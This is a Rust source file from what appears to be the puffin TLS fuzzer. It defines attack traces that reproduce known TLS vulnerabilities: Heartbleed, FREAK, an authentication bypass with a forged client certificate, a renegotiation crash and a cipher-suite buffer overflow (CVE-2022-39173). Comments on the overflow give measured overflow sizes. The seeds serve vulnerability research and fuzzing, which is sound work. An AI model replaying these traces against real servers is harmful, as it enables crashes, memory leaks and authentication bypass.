#![allow(dead_code)]

use puffin::agent::{AgentDescriptor, AgentName, AgentType, TLSVersion};
use puffin::algebra::dynamic_function::TypeShape;
use puffin::trace::{Action, InputAction, OutputAction, Step, Trace};
use puffin::{input_action, term};

use crate::protocol::{MessageFlight, TLSProtocolTypes};
use crate::query::TlsQueryMatcher;
use crate::tls::fn_impl::*;
use crate::tls::rustls::msgs::enums::HandshakeType;
use crate::tls::rustls::msgs::message::OpaqueMessage;
use crate::tls::seeds::*;

/// <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25638>
pub fn seed_cve_2022_25638(server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                  (fn_append_cipher_suite(
                  (fn_new_cipher_suites()),
                   fn_cipher_suite13_aes_128_gcm_sha256
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )))
    };

    let decrypted_handshake = term! {
        fn_decrypt_handshake_flight(
            ((server, 0)/MessageFlight), // The first flight of messages sent by the server
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0  // sequence 0
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_find_server_certificate_request((@decrypted_handshake))
    };

    let certificate_rsa = term! {
        fn_certificate13(
            (fn_payload_u8((fn_get_context((@certificate_request_message))))),
            //fn_empty_certificate_chain
            // Or append eve cert
            (fn_certificate_entries_make(
                (fn_chain_append_certificate_entry(
                (fn_certificate_entry(
                    fn_eve_cert
                )),
              fn_empty_certificate_chain
            ))))
        )
    };

    let certificate_verify_rsa = term! {
        fn_certificate_verify(
            fn_invalid_signature_algorithm,
            // Option 1 (something random, only possible because of fn_empty_certificate_chain, if FAIL_IF_NO_PEER_CERT is unset):
            //fn_eve_cert // or fn_empty_bytes_vec
            // Option 2 (impersonating eve, you have to send eve cert):
            (fn_payload_u16(fn_eve_pkcs1_signature))
            // Option 3 (for testing):
            /* (fn_rsa_sign_client(
                (fn_certificate_transcript(((server, 0)))),
                fn_eve_private_key, // some random private key
                fn_rsa_pkcs1_signature_algorithm
            ))*/
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@certificate_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                         fn_encrypt_handshake(
                            (@certificate_verify_rsa),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_2  // sequence 2
                        )
                    }
                }),
            },
        ],
    }
}

/// <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25640>
pub fn seed_cve_2022_25640(server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                  (fn_append_cipher_suite(
                  (fn_new_cipher_suites()),
                  fn_cipher_suite13_aes_128_gcm_sha256
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )))
    };

    let decrypted_handshake = term! {
        fn_decrypt_handshake_flight(
            ((server, 0)/MessageFlight), // The first flight of messages sent by the server
            (fn_server_hello_transcript(((server, 0)))),
            (fn_get_server_key_share(((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0  // sequence 0
        )
    };

    // ApplicationData 0 is EncryptedExtensions
    let certificate_request_message = term! {
        fn_find_server_certificate_request((@decrypted_handshake))
    };

    let certificate = term! {
        fn_certificate13(
            (fn_payload_u8((fn_get_context((@certificate_request_message))))),
            (fn_certificate_entries_make(
                (fn_chain_append_certificate_entry(
                (fn_certificate_entry(
                    fn_eve_cert
                )),
              fn_empty_certificate_chain
            ))))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_certificate_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@certificate),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_1  // sequence 1
                        )
                    }
                }),
            },
        ],
    }
}

/// <https://nvd.nist.gov/vuln/detail/cve-2021-3449>
pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TLSProtocolTypes> {
    let (mut trace, client_verify_data) = _seed_client_attacker12(server);

    let renegotiation_client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                (fn_support_group_extension(fn_named_group_secp384r1))
                            )),
                            fn_ec_point_formats_extension
                        )),
                        fn_signed_certificate_timestamp_extension
                    )),
                     // Enable Renegotiation
                    (fn_renegotiation_info_extension((fn_payload_u8((@client_verify_data)))))
                )),
                // Add signature cert extension
                fn_signature_algorithm_cert_extension
            ))
        )))
    };

    trace.steps.push(Step {
        agent: server,
        action: Action::Input(input_action! { term! {
                fn_encrypt12(
                    (@renegotiation_client_hello),
                    ((server, 0)),
                    (fn_decode_ecdh_pubkey(
                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                    )),
                    fn_named_group_secp384r1,
                    fn_true,
                    fn_seq_1
                )
            }
        }),
    });

    /*trace.steps.push(Step {
        agent: server,
        action: Action::Input(input_action! { term! {
                fn_encrypt12(
                    renegotiation_client_hello,
                    ((server, 0)),
                    (fn_decode_ecdh_pubkey(
                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                    )),
                    fn_named_group_secp384r1,
                    fn_true,
                    fn_seq_1
                )
            }
        }),
    });*/

    trace
}

pub fn seed_heartbleed(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        fn_client_extensions_new,
                        (fn_support_group_extension(fn_named_group_secp384r1))
                    )),
                    fn_ec_point_formats_extension
                )),
                fn_signed_certificate_timestamp_extension
            ))
        )))
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::new_client(client, TLSVersion::V1_2),
            AgentDescriptor::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { client_hello
                }),
            },
            // Send directly after client_hello such that this does not need to be encrypted
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_heartbeat_fake_length((fn_payload_u16(fn_empty_bytes_vec)), fn_large_length)
                    }
                }),
            },
        ],
    }
}

pub fn seed_freak(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::new_client(client, TLSVersion::V1_2),
            AgentDescriptor::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        (fn_cipher_suites_make(
                            (fn_append_cipher_suite(
                            (fn_new_cipher_suites()),
                            fn_weak_export_cipher_suite
                        )))),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                    fn_server_hello(
                        ((server, 0)),
                        ((server, 0)),
                        ((server, 0)),
                        (fn_secure_rsa_cipher_suite12),
                        ((server, 0)),
                        ((server, 0))
                    )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    }
                }),
            },
            // Server Key Exchange, Server -> Client
            // If the KEX fails here, then no ephemeral KEX is used
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_key_exchange(  // check whether the client rejects this if it does not support export
                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_hello_done
                    }
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_client_key_exchange(
                             ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_change_cipher_spec
                    }
                }),
            },
        ],
    }
}

/// A simplified version of [`seed_cve_2022_25640`]
pub fn seed_cve_2022_25640_simple(server: AgentName) -> Trace<TLSProtocolTypes> {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            (fn_support_group_extension(fn_named_group_secp384r1))
                        )),
                        fn_signature_algorithm_extension
                    )),
                    (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                )),
                fn_supported_versions13_extension
            ))
        )))
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk,
                fn_named_group_secp384r1
            ))
        )
    };

    Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            typ: AgentType::Server,
            client_authentication: true,
            ..AgentDescriptor::default()
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_named_group_secp384r1,
                            fn_true,
                            fn_seq_0  // sequence 0
                        )
                    }
                }),
            },
        ],
    }
}

pub fn seed_cve_2022_38153(client: AgentName, server: AgentName) -> Trace<TLSProtocolTypes> {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor::new_client(client, TLSVersion::V1_2),
            AgentDescriptor::new_server(server, TLSVersion::V1_2),
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                        fn_server_hello(
                            ((server, 0)),
                            ((server, 0)),
                            ((client, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0))
                        )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    }
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_key_exchange(
                            ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_server_hello_done
                    }
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_client_key_exchange(
                            ((client, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    }
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        fn_change_cipher_spec
                    }
                }),
            },
            // Client Handshake Finished, Client -> Server
            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
            // not know that the Handshake record message is encrypted. The parsed message from the
            // could be a HelloRequest if the encrypted data starts with a 0.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                           (client, 3)[None] > TypeShape::of::<OpaqueMessage>()
                    }
                }),
            },
            // NewSessionTicket, Server -> Client
            Step {
                agent: client,
                action: Action::Input(input_action! { term! {
                        fn_new_session_ticket(
                            ((server, 0)/u32),
                            (fn_payload_u16(fn_large_bytes_vec))
                        )
                    }
                }),
            },
        ],
    }
}

pub fn seed_cve_2022_39173(
    initial_server: AgentName,
    server: AgentName,
) -> Trace<TLSProtocolTypes> {
    let initial_handshake = seed_client_attacker(initial_server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };
    for _ in 0..149 {
        // also works with 149, 150 leads a too large list of suites (as expected)
        // Maximum reached suitesSz value depending on the number of ciphers in the list:
        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
        // 11 -> suiteSz remains below 300
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_128_gcm_sha256 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                (fn_append_cipher_suite(
                 (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                // CHANGED FROM fn_cipher_suite13_aes_128_gcm_sha256
                fn_cipher_suite13_aes_256_gcm_sha384
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )))
    };

    let psk = term! {
        fn_derive_psk(
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_client_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            (fn_get_ticket_nonce((@new_ticket_message))),
            fn_named_group_secp384r1
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk)
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    Trace {
        // Step 1: Prior trace performs an initial TLS 1.3 session with a full handshake and
        // establishes a PSK, including Client Hello number 1 (`CH1`).
        prior_traces: vec![initial_handshake],
        descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            // Step 2: sends a Client Hello (CH2) with a missing support_group_extension that will
            // make the server enters the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE`
            // and with PSK resuming previous session. CH2 includes a list of repeated
            // ciphers that will be stored in ssl->suites->suites.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @full_client_hello
                    }
                }),
            },
            // Step 3: sends a Client Hello (CH3) with a missing support_group_extension that will
            // keep the server in the state `SERVER_HELLO_RETRY_REQUEST_COMPLETE` and
            // with PSK resuming previous session. CH3 includes a list of repeated
            // ciphers that will be matched against ssl->suites->suites.
            // Since ssl->suites->suites already contain repeated ciphers, the function
            // refineSuites in tls13.c will wrongly consider all pairs leading to an
            // explosion of sizeSz and the buffer overflow. Note: CH3 could also
            // include support_group_extension.
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @full_client_hello
                    }
                }),
            },
        ],
    }
}

pub fn seed_cve_2022_39173_full(
    initial_server: AgentName,
    server: AgentName,
) -> Trace<TLSProtocolTypes> {
    let (
        initial_handshake,
        server_hello_transcript,
        server_finished_transcript,
        client_finished_transcript,
    ) = _seed_client_attacker_full(initial_server);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket?
            (@server_hello_transcript),
            (@server_finished_transcript),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_named_group_secp384r1,
            fn_true,
            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };

    for _ in 0..149 {
        // 200 is too large already
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_128_gcm_sha256 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                 (fn_append_cipher_suite(
                   (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                  fn_cipher_suite13_aes_128_gcm_sha256
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )))
    };

    let psk = term! {
        fn_derive_psk(
            (@server_hello_transcript),
            (@server_finished_transcript),
            (@client_finished_transcript),
            (fn_get_server_key_share(((initial_server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerHello)))]))),
            (fn_get_ticket_nonce((@new_ticket_message))),
            fn_named_group_secp384r1
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk)
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    Trace {
        prior_traces: vec![initial_handshake],
        descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @full_client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @full_client_hello
                    }
                }),
            },
        ],
    }
}

pub fn seed_cve_2022_39173_minimized(server: AgentName) -> Trace<TLSProtocolTypes> {
    // WAS REQUIRED: let initial_handshake = seed_client_attacker(initial_server);

    let new_ticket_message = term! {
        fn_new_session_ticket13(  // DUMMY resumption ticket
            (fn_payload_u8(fn_alice_cert)),
            (fn_payload_u16(fn_alice_cert)),
            (fn_new_session_ticket_extensions(fn_new_session_ticket_extensions_new))
        )
        // WAS:
        // fn_decrypt_application(
        //     ((initial_server, 4)[Some(TlsQueryMatcher::ApplicationData)]), // Ticket from last session
        //     (fn_server_hello_transcript(((initial_server, 0)))),
        //     (fn_server_finished_transcript(((initial_server, 0)))),
        //     (fn_get_server_key_share(((initial_server, 0)))),
        //     fn_no_psk,
        //     fn_named_group_secp384r1,
        //     fn_true,
        //     fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        // )
    };

    let mut cipher_suites = term! { fn_new_cipher_suites() };
    for _ in 0..149 {
        // also works with 149, 150 leads a too large list of suites (as expected)
        // Maximum reached suitesSz value depending on the number of ciphers in the list:
        // 149 -> suiteSz reaches >29461 (overflow of > 29161 bytes)
        // 14 -> suiteSz reaches 450 (overflow of 150 bytes)
        // 13 -> suiteSz reaches 392  (overflow of 92 bytes)
        // 12 -> suiteSz reaches 338  (overflow of 38 bytes)
        // 11 -> suiteSz remains below 300
        cipher_suites = term! {
            fn_append_cipher_suite(
                (@cipher_suites),
                fn_cipher_suite13_aes_256_gcm_sha384 // For 5.5.0 this MUST be a supported cipher suite
                //fn_cipher_suite12 // Works for 5.4.0
            )
        };
    }

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_cipher_suites_make(
                  (fn_append_cipher_suite(
                   (@cipher_suites), // CHANGED FROM: (fn_new_cipher_suites()),
                  // CHANGED FROM fn_cipher_suite13_aes_128_gcm_sha256
                  fn_cipher_suite13_aes_256_gcm_sha384
            )))),
            fn_compressions,
            (fn_client_extensions_make(
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )))
    };

    Trace {
        // No more need for a prior trace and a full handshake.
        prior_traces: vec![], // WAS [initial_handshake],
        descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
            Step {
                agent: server,
                action: Action::Input(input_action! { term! {
                        @client_hello
                    }
                }),
            },
        ],
    }
}

#[cfg(test)]
pub mod tests {
    use puffin::algebra::TermType;

    #[allow(unused_imports)]
    use crate::{test_utils::prelude::*, tls::vulnerabilities::*};

    #[test_log::test]
    fn test_term_sizes() {
        let client = AgentName::first();
        let _server = client.next();

        for (name, trace) in [
            seed_cve_2022_25638.build_named_trace(),
            seed_cve_2022_25640.build_named_trace(),
            seed_cve_2021_3449.build_named_trace(),
            seed_heartbleed.build_named_trace(),
            seed_freak.build_named_trace(),
            seed_cve_2022_25640_simple.build_named_trace(),
            seed_cve_2022_38153.build_named_trace(),
            // TODO: 685 seed_cve_2022_39173.build_named_trace(),
            // TODO: 1695 seed_cve_2022_39173_full.build_named_trace(),
            // TODO: 322 seed_cve_2022_39173_minimized.build_named_trace(),
        ] {
            for step in &trace.steps {
                match &step.action {
                    Action::Input(input) => {
                        // should be below a certain threshold, else we should increase
                        // max_term_size in fuzzer setup
                        let terms = input.recipe.size();
                        assert!(
                            terms < 300,
                            "{} has step with too large term size {}!",
                            name,
                            terms
                        );
                    }
                    Action::Output(_) => {}
                }
            }
        }
    }
}
